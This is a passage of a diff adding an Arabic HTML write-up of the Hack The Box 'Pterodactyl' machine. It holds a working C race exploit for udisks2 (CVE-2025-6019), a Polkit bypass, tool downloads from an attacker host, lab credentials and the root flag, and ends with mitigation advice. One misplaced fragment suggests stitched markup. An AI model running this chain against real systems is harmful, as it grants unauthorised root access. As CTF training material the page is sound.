+gcc -O2 -o /tmp/racer /tmp/racer.c
+
+<span class="cm"># تشغيل HTTP server لنقل الملفين إلى الـ target</span>
+cd /tmp && sudo python3 -m http.server 80</code></pre>
+    </div>
+
+    <h4 style="color:var(--accent);margin:20px 0 10px;font-size:.95rem">الخطوة 2: برنامج Race Condition (racer.c)</h4>
+
+    <p>
+      يراقب <code class="inline">/run/media/phileasfogg3/</code> — المسار الذي يُركّب فيه
+      udisks2 الـ image — ويُنفّذ الـ <code class="inline">xpl</code> (SUID bash) فور رؤيته:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C</span>
+        <span class="code-desc">racer.c — مراقبة /run/media/phileasfogg3/ وتنفيذ SUID</span>
+      </div>
+      <pre><code><span class="ck">#include</span> <span class="cs">&lt;stdio.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;stdlib.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;dirent.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;sys/stat.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;sys/wait.h&gt;</span>
+<span class="ck">#include</span> <span class="cs">&lt;unistd.h&gt;</span>
+
+<span class="ck">int</span> main() {
+    <span class="ck">char</span> xpl[<span class="cn">512</span>]; <span class="ck">struct</span> stat st;
+    printf(<span class="cs">"[*] Racer started...\n"</span>); fflush(stdout);
+    <span class="ck">while</span>(<span class="cn">1</span>) {
+        DIR *d = opendir(<span class="cs">"/run/media/phileasfogg3"</span>);
+        <span class="ck">if</span> (!d) { usleep(<span class="cn">20000</span>); <span class="ck">continue</span>; }
+        <span class="ck">struct</span> dirent *e;
+        <span class="ck">while</span>((e = readdir(d)) != NULL) {
+            <span class="ck">if</span>(e->d_name[<span class="cn">0</span>] == <span class="cs">'.'</span>) <span class="ck">continue</span>;
+            snprintf(xpl, <span class="ck">sizeof</span>(xpl),
+                <span class="cs">"/run/media/phileasfogg3/%s/xpl"</span>, e->d_name);
+            <span class="ck">if</span>(stat(xpl, &st) == <span class="cn">0</span> && (st.st_mode & S_ISUID)) {
+                unlink(<span class="cs">"/tmp/b"</span>);
+                pid_t pid = fork();
+                <span class="ck">if</span> (pid == <span class="cn">0</span>) {
+                    execl(xpl, xpl, <span class="cs">"-p"</span>, <span class="cs">"-c"</span>,
+                        <span class="cs">"cp /bin/bash /tmp/b; chmod 4755 /tmp/b"</span>, NULL);
+                    _exit(<span class="cn">1</span>);
+                } <span class="ck">else if</span> (pid > <span class="cn">0</span>) {
+                    waitpid(pid, NULL, <span class="cn">0</span>);
+                    <span class="ck">struct</span> stat bst;
+                    <span class="ck">if</span>(stat(<span class="cs">"/tmp/b"</span>, &bst)==<span class="cn">0</span> &&
+                       bst.st_uid==<span class="cn">0</span> && (bst.st_mode & S_ISUID)) {
+                        printf(<span class="cs">"[+] RACE WON! /tmp/b is root SUID bash!\n"</span>);
+                        fflush(stdout); closedir(d); <span class="ck">return</span> <span class="cn">0</span>;
+                    }
+                }
+            }
+        }
+        closedir(d); usleep(<span class="cn">500</span>);
+    }
+}</code></pre>
+    </div>
+
+    <h4 style="color:var(--accent);margin:20px 0 10px;font-size:.95rem">الخطوة 3: تنزيل الأدوات على الـ Target</h4>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH — Target SSH</span>
+        <span class="code-desc">تنزيل XFS image و racer من Kali</span>
+      </div>
+      <pre><code>ssh phileasfogg3@10.129.45.106
+<span class="cm"># Password: !QAZ2wsx</span>
+
+<span class="cm"># تنزيل الملفين (عدّل IP لـ tun0 تبتك)</span>
+wget http://&lt;KALI_IP&gt;/xfs_new.img -O /tmp/xfs_new.img
+wget http://&lt;KALI_IP&gt;/racer -O /tmp/racer && chmod +x /tmp/racer
+
+<span class="cm"># التحقق</span>
+ls -lh /tmp/xfs_new.img /tmp/racer
+<span class="co">-rw-r--r-- 1 phileasfogg3 users 300M /tmp/xfs_new.img
+-rwxr-xr-x 1 phileasfogg3 users  16K /tmp/racer</span></code></pre>
+    </div>
+
+    <h4 style="color:var(--accent);margin:20px 0 10px;font-size:.95rem">الخطوة 4: تشغيل الاستغلال (كل شيء عبر su -c)</h4>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH — Target SSH</span>
+        <span class="code-desc">الاستغلال الكامل — su -c لتجاوز Polkit</span>
+      </div>
+      <pre><code><span class="cm"># 1. إعداد loop device (عبر su -c → Remote=no → Polkit يقبل)</span>
+su -c "udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction" - phileasfogg3 &lt;&lt;'EOF'
+!QAZ2wsx
+EOF
+<span class="co" style="color:var(--green)">Mapped file /tmp/xfs_new.img as /dev/loop0.</span>
+
+<span class="cm"># 2. تركيب الـ image</span>
+su -c "udisksctl mount -b /dev/loop0 --no-user-interaction" - phileasfogg3 &lt;&lt;'EOF'
+!QAZ2wsx
+EOF
+<span class="co">Mounted /dev/loop0 at /run/media/phileasfogg3/&lt;UUID&gt;</span>
+
+<span class="cm"># 3. تشغيل racer في الخلفية</span>
+/tmp/racer &
+
+<span class="cm"># 4. إطلاق 500 عملية Filesystem.Resize بالتوازي (عبر su -c)</span>
+su -c "for i in \$(seq 1 500); do gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>/dev/null & done; wait" - phileasfogg3 &lt;&lt;'EOF'
+!QAZ2wsx
+EOF
+
+<span class="cm"># 5. التحقق من النتيجة</span>
+ls -la /tmp/b
+<span class="co">-<span style="color:var(--red)">rwsr-xr-x</span> 1 root root 1384752 /tmp/b</span>
+
+<span class="cm"># 6. الحصول على root shell</span>
+/tmp/b -p -c "id; cat /root/root.txt"
+<span class="co">uid=1002(phileasfogg3) gid=100(users) <span style="color:var(--green);font-weight:700">euid=0(root)</span> groups=100(users)
+<span style="color:var(--accent);font-weight:700">&#60;root_flag&#62;</span></span></code></pre>
+    </div>
+
+    <div class="result-box result-success">
+      <div class="label">&#127881; ROOT OBTAINED</div>
+      <p>
+        <strong>euid=0(root)</strong> — وصلنا إلى root بنجاح!<br>
+        الـ race condition تفوز عندما تُركَّب الـ XFS بدون <code class="inline">nosuid</code> خلال الـ Resize،
+        فيُنفّذ الـ racer الـ SUID bash قبل الـ unmount.
+      </p>
+    </div>
+
+    <div class="result-box result-info">
+      <div class="label">&#128161; ملاحظة: إذا لم تنجح الجولة الأولى</div>
+      <p>
+        كرّر الخطوة 4 عدة مرات (5-7 جولات). الـ race condition تحتاج توقيت دقيق.
+        يمكن أيضاً زيادة العدد إلى 1000 بدلاً من 500.
+      </p>
+      <div class="code-block" style="margin-top:12px">
+        <div class="code-header"><span class="code-lang">BASH</span><span class="code-desc">إعادة المحاولة</span></div>
+        <pre><code><span class="cm"># كرّر إذا لم يظهر /tmp/b</span>
+for round in 1 2 3 4 5; do
+  echo "[*] Round $round"
+  su -c "for i in \$(seq 1 500); do gdbus call --system \\
+    --dest org.freedesktop.UDisks2 \\
+    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \\
+    --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' \\
+    2>/dev/null & done; wait" - phileasfogg3 &lt;&lt;'EOF'
+!QAZ2wsx
+EOF
+  ls /tmp/b 2>/dev/null && break
+done</code></pre>
+      </div>
+    </div>
+  </div>
+
+<span class="cm"># تنفيذ SUID binary مباشرةً</span>
+/tmp/blockdev.677GO3/xpl -p -c 'id && cat /root/root.txt'
+
+<span class="co">uid=1002(phileasfogg3) gid=100(users) <span style="color:var(--green);font-weight:700">euid=0(root)</span> groups=100(users)
+<span class="spoiler" onclick="this.classList.toggle('revealed')" style="color:var(--accent);font-weight:700">180e7ff6ad50172ffa3213add52ac9fb</span></span></code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ CVE REFERENCE ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">7</div>
+      <h2>مرجع الثغرات المستخدمة</h2>
+    </div>
+
+    <table class="info-table">
+      <thead>
+        <tr>
+          <th>CVE</th>
+          <th>المكوّن</th>
+          <th>النوع</th>
+          <th>المرحلة</th>
+          <th>التأثير</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong style="color:var(--red)">CVE-2025-49132</strong></td>
+          <td>Pterodactyl Panel</td>
+          <td>Arbitrary File Read</td>
+          <td>Initial Access</td>
+          <td>قراءة .env → DB credentials → hash crack → SSH</td>
+        </tr>
+        <tr>
+          <td><strong style="color:var(--red)">CVE-2025-6018</strong></td>
+          <td>openSUSE pam_env.so</td>
+          <td>Authentication Bypass</td>
+          <td>Privilege Escalation</td>
+          <td>Polkit allow_active bypass</td>
+        </tr>
+        <tr>
+          <td><strong style="color:var(--red)">CVE-2025-6019</strong></td>
+          <td>udisks2 Filesystem.Resize</td>
+          <td>TOCTOU Race Condition</td>
+          <td>Privilege Escalation</td>
+          <td>SUID execution → root</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ══════════════ TECHNICAL DEEP DIVE ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">8</div>
+      <h2>التحليل التقني — كيف تعمل الثغرات</h2>
+    </div>
+
+    <h3 style="color:var(--accent);margin-bottom:14px;font-size:1rem">🔍 CVE-2025-6018: لماذا يعمل حقن XDG_SEAT؟</h3>
+    <p>
+      Polkit (PolicyKit) هو framework للتحكم في الصلاحيات في Linux. يُميّز بين نوعين من الجلسات:
+    </p>
+    <ul style="margin:14px 0 14px 20px;color:var(--muted);line-height:2">
+      <li><strong style="color:var(--yellow)">allow_inactive</strong>: جلسة SSH أو remote — صلاحيات محدودة</li>
+      <li><strong style="color:var(--green)">allow_active</strong>: جلسة console/local — صلاحيات أوسع</li>
+    </ul>
+    <p>
+      logind (systemd) يُحدد نوع الجلسة بناءً على <code class="inline">XDG_SEAT</code> و
+      <code class="inline">XDG_VTNR</code>. في openSUSE، <code class="inline">pam_env.so</code>
+      يُعيّن هذين المتغيرين من <code class="inline">~/.pam_environment</code> قبل أن يسجّل
+      logind الجلسة، مما يجعل الجلسة تبدو كـ active session.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">FLOW</span>
+        <span class="code-desc">تدفق CVE-2025-6018</span>
+      </div>
+      <pre><code>SSH Login
+   │
+   ▼
+pam_env.so reads ~/.pam_environment
+   │  XDG_SEAT=seat0
+   │  XDG_VTNR=1
+   ▼
+PAM sets environment variables in new session
+   │
+   ▼
+logind registers session WITH XDG_SEAT + XDG_VTNR
+   │  → Session Type: x11/mir (active)
+   ▼
+Polkit checks session type
+   │  → org.freedesktop.login1.Session.Type = "active"
+   ▼
+Policy: <span style="color:var(--green)">allow_active</span> ✓ (instead of allow_inactive)</code></pre>
+    </div>
+
+    <h3 style="color:var(--accent);margin:28px 0 14px;font-size:1rem">🔍 CVE-2025-6019: لماذا udisks2 يُركّب بدون nosuid؟</h3>
+    <p>
+      عند استدعاء <code class="inline">Filesystem.Resize</code> على XFS image، udisks2 ينفّذ
+      الخطوات التالية داخلياً:
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">FLOW</span>
+        <span class="code-desc">تدفق CVE-2025-6019 — سبب الثغرة</span>
+      </div>
+      <pre><code>udisks2 receives D-Bus Filesystem.Resize request
+   │
+   ▼
+Creates temp mount point: /tmp/blockdev.XXXXXX/
+   │
+   ▼
+Mounts the XFS image:
+   mount -t xfs /dev/loopX /tmp/blockdev.XXXXXX/
+   │
+   │  ⚠️  BUG: Missing "nosuid" mount option!
+   │  Correct:   mount -o nosuid,nodev -t xfs ...
+   │  Actual:    mount -t xfs ...  (no nosuid!)
+   ▼
+Runs xfs_growfs to resize
+   │
+   ▼  ← RACE WINDOW HERE (milliseconds)
+   │  Files inside mount are executed WITH their SUID bits
+   │  Our /tmp/blockdev.XXXXXX/xpl is -rwsr-xr-x root
+   │  Running it gives euid=0
+   ▼
+udisks2 unmounts (too late, we already ran xpl)</code></pre>
+    </div>
+  </div>
+
+  <!-- ══════════════ SUMMARY ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">9</div>
+      <h2>ملخص المسار الكامل</h2>
+    </div>
+
+    <div class="summary-grid">
+      <div class="summary-card">
+        <div class="phase">المرحلة 1</div>
+        <div class="tech">Nmap + Web Enum</div>
+        <div class="cve">Port 22, 80/443 — Pterodactyl Panel</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 2</div>
+        <div class="tech">Pterodactyl Panel File Read</div>
+        <div class="cve">CVE-2025-49132 → قراءة .env</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 3</div>
+        <div class="tech">MySQL + Hash Extraction</div>
+        <div class="cve">pterodactyl:PteraPanel → bcrypt hash</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 4</div>
+        <div class="tech">Hashcat bcrypt Crack</div>
+        <div class="cve">phileasfogg3:!QAZ2wsx</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 5</div>
+        <div class="tech">SSH Login + User Flag</div>
+        <div class="cve">SSH → /home/phileasfogg3/user.txt</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 6</div>
+        <div class="tech">Polkit allow_active Bypass</div>
+        <div class="cve">CVE-2025-6018 → ~/.pam_environment</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 7</div>
+        <div class="tech">XFS Image + SUID Setup</div>
+        <div class="cve">300MB XFS + /bin/bash SUID 4755</div>
+      </div>
+      <div class="summary-card">
+        <div class="phase">المرحلة 8</div>
+        <div class="tech">udisks2 Race Condition</div>
+        <div class="cve">CVE-2025-6019 → euid=0 → Root Flag</div>
+      </div>
+    </div>
+
+    <div class="result-box result-success" style="margin-top:28px">
+      <div class="label">&#127937; الفلاقز النهائية</div>
+      <table style="width:100%;font-family:monospace;font-size:14px">
+        <tr>
+          <td style="padding:6px 0;color:var(--muted)">User Flag:</td>
+          <td style="color:var(--accent);padding:6px 0">/home/phileasfogg3/user.txt — ✓ Obtained</td>
+        </tr>
+        <tr>
+          <td style="padding:6px 0;color:var(--muted)">Root Flag:</td>
+          <td style="color:var(--green);padding:6px 0;font-weight:700"><span class="spoiler" onclick="this.classList.toggle('revealed')">180e7ff6ad50172ffa3213add52ac9fb</span></td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ══════════════ LESSONS ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">10</div>
+      <h2>الدروس المستفادة والتوصيات</h2>
+    </div>
+
+    <ul class="steps">
+      <li>
+        <div class="step-num">&#9888;</div>
+        <div class="content">
+          <strong>تحديث Pterodactyl Panel</strong>
+          <span>يجب تحديث Panel إلى أحدث إصدار وتطبيق security patches لـ CVE-2025-49132 (Arbitrary File Read). تقييد الوصول إلى endpoints التي تتعامل مع مسارات الملفات وتطبيق path traversal protection.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">&#9888;</div>
+        <div class="content">
+          <strong>تعطيل pam_env ~/.pam_environment على openSUSE</strong>
+          <span>يجب تعطيل قراءة ~/.pam_environment في pam_env.so أو تصحيح منطق Polkit/logind للتحقق من نوع الجلسة بشكل مستقل عن XDG_SEAT.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">&#9888;</div>
+        <div class="content">
+          <strong>تحديث udisks2 وإضافة nosuid</strong>
+          <span>يجب تحديث udisks2 إلى الإصدار المُرقَّع. في النسخة المُصلَّحة، تُضاف خيارات <code class="inline">nosuid,nodev,noexec</code> عند mount الـ filesystems المؤقتة.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">&#9888;</div>
+        <div class="content">
+          <strong>عدم إعادة استخدام كلمات المرور</strong>
+          <span>كلمة مرور قاعدة البيانات يجب أن تختلف تماماً عن كلمة مرور حساب Linux. تطبيق مبدأ Least Privilege للمستخدمين.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">&#128161;</div>
+        <div class="content">
+          <strong>سلسلة الاستغلال المبدعة</strong>
+          <span>الجمع بين CVE-2025-6018 (Polkit bypass) و CVE-2025-6019 (udisks2) هو مثال ممتاز على كيفية ربط ثغرات متعددة ومنخفضة الخطورة منفردةً لتحقيق root. هذا النوع من الاستغلال المتسلسل شائع في CTFs ومهارة جوهرية للـ pentesters.</span>
+        </div>
+      </li>
+    </ul>
+  </div>
+
+</div>
+
+<!-- ══════════════ FOOTER ══════════════ -->
+<div class="footer">
+  <p>HTB Pterodactyl — Medium Linux &nbsp;|&nbsp; Season 10 &nbsp;|&nbsp; Solved: 30 April 2026</p>
+  <p style="margin-top:8px;font-size:12px">
+    CVEs: CVE-2025-49132 &bull; CVE-2025-6018 &bull; CVE-2025-6019
+  </p>
+</div>
+
+</body>
+</html>
